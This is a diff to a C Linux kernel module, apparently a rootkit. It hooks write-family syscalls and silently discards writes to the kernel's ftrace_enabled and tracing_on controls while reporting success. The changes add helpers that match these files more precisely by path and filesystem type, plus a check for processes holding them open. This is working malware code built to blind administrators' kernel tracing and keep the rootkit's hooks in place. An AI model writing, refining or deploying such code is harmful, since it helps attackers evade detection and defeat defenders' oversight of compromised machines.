@@ -37,6 +37,85 @@ static asmlinkage ssize_t (*original_tee_ia32)(const struct pt_regs *);
 static asmlinkage long (*original_io_uring_enter)(const struct pt_regs *);
 static asmlinkage long (*original_io_uring_enter2)(const struct pt_regs *);
 
+static notrace bool is_real_ftrace_enabled(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry;
+    struct super_block *sb;
+    struct dentry *parent;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "ftrace_enabled") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "proc") != 0 && 
+        strcmp(sb->s_type->name, "sysfs") != 0)
+        return false;
+    
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "kernel") != 0)
+        return false;
+    
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name)
+        return false;
+    
+    if (strcmp(parent->d_name.name, "sys") != 0)
+        return false;
+    
+    return true;
+}
+
+static notrace bool is_real_tracing_on(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry;
+    struct super_block *sb;
+    
+    if (!file || !file->f_path.dentry)
+        return false;
+    
+    dentry = file->f_path.dentry;
+    
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+    
+    if (!name || strcmp(name, "tracing_on") != 0)
+        return false;
+    
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+    
+    sb = file->f_path.mnt->mnt_sb;
+    
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+    
+    if (strcmp(sb->s_type->name, "tracefs") != 0 && 
+        strcmp(sb->s_type->name, "debugfs") != 0)
+        return false;
+    
+    return true;
+}
+
 static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs,
                                                      asmlinkage ssize_t (*orig)(const struct pt_regs *),
                                                      bool compat32, bool has_offset)
@@ -61,11 +140,7 @@ static notrace asmlinkage ssize_t hooked_write_common(const struct pt_regs *regs
     if (!file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
-        name = file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
         fput(file);
 
         char *kernel_buf = kmalloc(BUF_SIZE, GFP_KERNEL);
@@ -132,11 +207,7 @@ static notrace asmlinkage ssize_t hooked_writev_common(const struct pt_regs *reg
     if (!file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
-        name = file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
         fput(file);
         return vlen;
     }
@@ -193,11 +264,7 @@ static notrace asmlinkage ssize_t hooked_fd_transfer_common(const struct pt_regs
     if (!out_file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
-        name = out_file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
         fput(out_file);
         return count;
     }
@@ -259,11 +326,7 @@ static notrace asmlinkage ssize_t hooked_copy_file_range_common(const struct pt_
     if (!out_file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
-        name = out_file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
         fput(out_file);
         return count;
     }
@@ -305,11 +368,7 @@ static notrace asmlinkage ssize_t hooked_splice_common(const struct pt_regs *reg
     if (!out_file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
-        name = out_file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
         fput(out_file);
         return count;
     }
@@ -349,11 +408,7 @@ static notrace asmlinkage ssize_t hooked_vmsplice_common(const struct pt_regs *r
     if (!file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (file->f_path.dentry && file->f_path.dentry->d_name.name)
-        name = file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
         fput(file);
         return nr_segs;
     }
@@ -395,11 +450,7 @@ static notrace asmlinkage ssize_t hooked_tee_common(const struct pt_regs *regs,
     if (!out_file)
         return orig(regs);
 
-    const char *name = NULL;
-    if (out_file->f_path.dentry && out_file->f_path.dentry->d_name.name)
-        name = out_file->f_path.dentry->d_name.name;
-
-    if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || strcmp(name, "tracing_on") == 0)) {
+    if (is_real_ftrace_enabled(out_file) || is_real_tracing_on(out_file)) {
         fput(out_file);
         return count;
     }
@@ -446,15 +497,7 @@ static bool process_has_protected_fd(void)
     for (i = 0; i < fdt->max_fds; i++) {
         file = fdt->fd[i];
         if (file) {
-            const char *name = NULL;
-            struct dentry *dentry;
-            
-            dentry = file->f_path.dentry;
-            if (dentry && dentry->d_name.name)
-                name = dentry->d_name.name;
-            
-            if (name && (strcmp(name, "/proc/sys/kernel/ftrace_enabled") == 0 || 
-                       strcmp(name, "tracing_on") == 0)) {
+            if (is_real_ftrace_enabled(file) || is_real_tracing_on(file)) {
                 has_protected = true;
                 break;
             }
